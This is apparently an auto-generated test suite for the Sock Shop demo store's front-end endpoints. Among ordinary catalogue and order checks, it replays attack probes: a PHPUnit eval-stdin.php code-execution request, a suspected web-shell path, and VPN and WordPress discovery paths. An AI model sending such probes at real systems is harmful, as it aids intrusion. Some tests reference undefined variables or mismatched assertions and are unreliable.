describe.each(dataset("data/dataset_121.json"))("test_121_get_catalogue", (size) => {
    it("test_121_get_catalogue", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 121)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", "1"], ["size", size], ["tags", "large"]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_48.json"))("test_048_get_catalogue_id", (page, size, tags) => {
    it("test_048_get_catalogue_id", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 147)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", page], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].tag[*]",
                json: data
            })).not.toBeNull();
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // GET http://front-end.sock-shop/catalogue/{id} (endp 48)
            return front_end_sock_shop.fetch("/catalogue/" + id, {
                headers: {
                    "x-requested-with": "XMLHttpRequest"
                }
            })
            .then((response) => {
                expect(response.status).toEqual(200);
                return response.text();
            })
            .then((text) => {
            })
            .then((data) => {
            });
        });
    });
});

describe.each(dataset("data/dataset_166.json"))("test_166_get_catalogue_id", (page, size, tags) => {
    it("test_166_get_catalogue_id", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 147)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", page], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].tag[*]",
                json: data
            })).not.toBeNull();
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // GET http://front-end.sock-shop/catalogue/{id} (endp 166)
            return front_end_sock_shop.fetch("/catalogue/" + id, {
                headers: {
                    "x-requested-with": "XMLHttpRequest"
                }
            })
            .then((response) => {
                expect(response.status).toEqual(200);
                return response.text();
            })
            .then((text) => {
            })
            .then((data) => {
            });
        });
    });
});

it("test_075_get_catalogue_size", () => {
    clearSession();

    // GET http://front-end.sock-shop/tags (endp 83)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/tags", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        const tags = JSONPath({
            path: "$.tags[*]",
            json: data
        })[0];

        // GET http://front-end.sock-shop/catalogue/size (endp 75)
        return front_end_sock_shop.fetch("/catalogue/size" + urlencode([["tags", tags]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

it("test_177_get_catalogue_size", () => {
    clearSession();

    // GET http://front-end.sock-shop/catalogue/size (endp 177)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/catalogue/size" + urlencode([["tags", ""]]), {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_18.json"))("test_018_get_category_html", (tags) => {
    it("test_018_get_category_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/category.html (endp 18)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/category.html" + urlencode([["tags", tags]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#content div.container div div.row.same-height-row div div.box.same-height h3", text)).toContain("You may also like these products");
        })
        .then((data) => {
        });
    });
});

it("test_179_get_category_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/category.html (endp 179)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/category.html" + urlencode([["page", "2"]]))
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#content div.container div div.panel.panel-default.sidebar-menu div.panel-heading h3.panel-title", text)).toContain("Filters ");
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_77.json"))("test_077_get_customer_order_html", (order) => {
    it("test_077_get_customer_order_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/customer-order.html (endp 77)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/customer-order.html" + urlencode([["order", order]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#customer-order div.box h2", text)).toContain("Order #");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_180.json"))("test_180_get_customer_order_html", (order) => {
    it("test_180_get_customer_order_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/customer-order.html (endp 180)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/customer-order.html" + urlencode([["order", order]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#customer-order div.box h2", text)).toContain("Order #");
        })
        .then((data) => {
        });
    });
});

it("test_078_get_customer_orders_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/customer-orders.html (endp 78)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/customer-orders.html")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#customer-orders div.box h1", text)).toContain("My orders");
    })
    .then((data) => {
    });
});

it("test_181_get_customer_orders_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/customer-orders.html (endp 181)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/customer-orders.html")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#customer-orders div.box h1", text)).toContain("My orders");
    })
    .then((data) => {
    });
});

it("test_050_get_customers_customerId", () => {
    clearSession();

    // GET http://front-end.sock-shop/customers/{customerId} (endp 50)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/customers/" + String(response.headers.raw()["set-cookie"]["logged_in"]), {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_148_get_customers_customerId", () => {
    clearSession();

    // GET http://front-end.sock-shop/customers/{customerId} (endp 148)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/customers/" + String(response.headers.raw()["set-cookie"]["logged_in"]), {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_163_get_customers_wcbVLjJnpzpezACrWupvwuuQUEpXSBhZ", () => {
    clearSession();

    // GET http://front-end.sock-shop/customers/wcbVLjJnpzpezACrWupvwuuQUEpXSBhZ (endp 163)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/customers/wcbVLjJnpzpezACrWupvwuuQUEpXSBhZ", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.lastName",
            json: data
        })).toContain("Name");
    });
});

it("test_019_get_detail_html", () => {
    clearSession();

    // POST http://front-end.sock-shop/orders (endp 21)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        method: "POST",
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.address.city",
            json: data
        })).toContain("Glasgow");
        const id = JSONPath({
            path: "$.items[*].itemId",
            json: data
        })[0];

        // GET http://front-end.sock-shop/detail.html (endp 19)
        return front_end_sock_shop.fetch("/detail.html" + urlencode([["id", id]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#content div.container div div.row.same-height-row div div.box.same-height h3", text)).toContain("You may also like these products");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_183.json"))("test_183_get_detail_html", (page, size, tags) => {
    it("test_183_get_detail_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 147)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", page], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].tag[*]",
                json: data
            })).not.toBeNull();
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // GET http://front-end.sock-shop/detail.html (endp 183)
            return front_end_sock_shop.fetch("/detail.html" + urlencode([["id", id]]))
            .then((response) => {
                expect(response.status).toEqual(200);
                return response.text();
            })
            .then((text) => {
                expect(CSSselect("div#content div.container div div.row.same-height-row div div.box.same-height h3", text)).toContain("You may also like these products");
            })
            .then((data) => {
            });
        });
    });
});

it("test_054_get_footer_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/footer.html (endp 54)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/footer.html", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#copyright div.container div p.pull-left a", text)).toContain("Weaveworks");
    })
    .then((data) => {
    });
});

it("test_101_get_footer_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/footer.html (endp 101)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/footer.html", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_149_get_footer_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/footer.html (endp 149)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/footer.html", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#copyright div.container div p.pull-left a", text)).toContain("Weaveworks");
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_61.json"))("test_061_get_index_html", (urlmaskfilter) => {
    it("test_061_get_index_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/index.html (endp 61)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/index.html" + urlencode([["urlmaskfilter", urlmaskfilter]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_184.json"))("test_184_get_index_html", (findcli) => {
    it("test_184_get_index_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/index.html (endp 184)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/index.html" + urlencode([["findcli", findcli], ["test", ""]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

it("test_210_head_index_html", () => {
    clearSession();

    // HEAD http://front-end.sock-shop/index.html (endp 210)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/index.html", {
        method: "HEAD"
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_95.json"))("test_095_post_lib_phpunit_phpunit_src_Util_PHP_eval_stdin_php", (__) => {
    it("test_095_post_lib_phpunit_phpunit_src_Util_PHP_eval_stdin_php", () => {
        clearSession();

        // POST http://front-end.sock-shop/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php (endp 95)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
                "<?": __,
                "?>": ""
            })
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

// authentication-related test
it("test_020_get_login", () => {
    clearSession();

    // GET http://front-end.sock-shop/login (endp 20)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop");
    return front_end_sock_shop.fetch("/login", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

// authentication-related test
it("test_150_get_login", () => {
    clearSession();

    // GET http://front-end.sock-shop/login (endp 150)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop");
    return front_end_sock_shop.fetch("/login", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("p", text)).toContain("Cookie is set");
    })
    .then((data) => {
    });
});

it("test_215_get_metrics", () => {
    clearSession();

    // GET http://front-end.sock-shop/metrics (endp 215)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/metrics")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_022_post_orders", () => {
    clearSession();

    // POST http://front-end.sock-shop/orders (endp 22)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        method: "POST"
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_186_get_orders", () => {
    clearSession();

    // GET http://front-end.sock-shop/orders (endp 186)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$[*].address.city",
            json: data
        })).toContain("elsewhere");
    });
});

it("test_187_post_orders", () => {
    clearSession();

    // POST http://front-end.sock-shop/orders (endp 187)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        method: "POST",
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.card.ccv",
            json: data
        })).not.toBeNull();
    });
});

it("test_082_get_orders_id", () => {
    clearSession();

    // GET http://front-end.sock-shop/orders (endp 80)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.[*].address.city",
            json: data
        })).toContain("Glasgow");
        const id = urlPart("/2", JSONPath({
            path: "$[*]._links.self.href",
            json: data
        })[0]);

        // GET http://front-end.sock-shop/orders/{id} (endp 82)
        return front_end_sock_shop.fetch("/orders/" + id, {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$.address.city",
                json: data
            })).toContain("Glasgow");
        });
    });
});

it("test_188_get_orders_id", () => {
    clearSession();

    // GET http://front-end.sock-shop/orders (endp 80)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.[*].address.city",
            json: data
        })).toContain("Glasgow");
        const id = urlPart("/2", JSONPath({
            path: "$[*]._links.self.href",
            json: data
        })[0]);

        // GET http://front-end.sock-shop/orders/{id} (endp 188)
        return front_end_sock_shop.fetch("/orders/" + id, {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$.address.city",
                json: data
            })).toContain("elsewhere");
        });
    });
});

describe.each(dataset("data/dataset_102.json"))("test_102_post_plus_qiang_php", (blbl) => {
    it("test_102_post_plus_qiang_php", () => {
        clearSession();

        // POST http://front-end.sock-shop/plus/qiang.php (endp 102)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/plus/qiang.php", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
                "blbl": blbl
            })
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

// authentication-related test
it("test_066_get_por_login_psw_csp", () => {
    clearSession();

    // GET http://front-end.sock-shop/por/login_psw.csp (endp 66)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop");
    return front_end_sock_shop.fetch("/por/login_psw.csp")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

// authentication-related test
describe.each(dataset("data/dataset_189.json"))("test_189_post_register", (email, firstName, lastName, password, username) => {
    it("test_189_post_register", () => {
        clearSession();

        // POST http://front-end.sock-shop/register (endp 189)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop");
        return front_end_sock_shop.fetch("/register", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/payload_for_endp_189.json", {
                "$.email": email,
                "$.firstName": firstName,
                "$.lastName": lastName,
                "$.password": password,
                "$.username": username
            })
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

it("test_190_get_tags", () => {
    clearSession();

    // GET http://front-end.sock-shop/tags (endp 190)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/tags", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_056_get_topbar_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/topbar.html (endp 56)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/topbar.html", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_152_get_topbar_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/topbar.html (endp 152)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/topbar.html", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#top div.container div.offer a.btn.btn-success", text)).toContain("Offer of the day");
    })
    .then((data) => {
    });
});

it("test_289_get_wp_includes_wlwmanifest_xml", () => {
    clearSession();

    // GET http://front-end.sock-shop/wp-includes/wlwmanifest.xml (endp 289)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/wp-includes/wlwmanifest.xml")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});
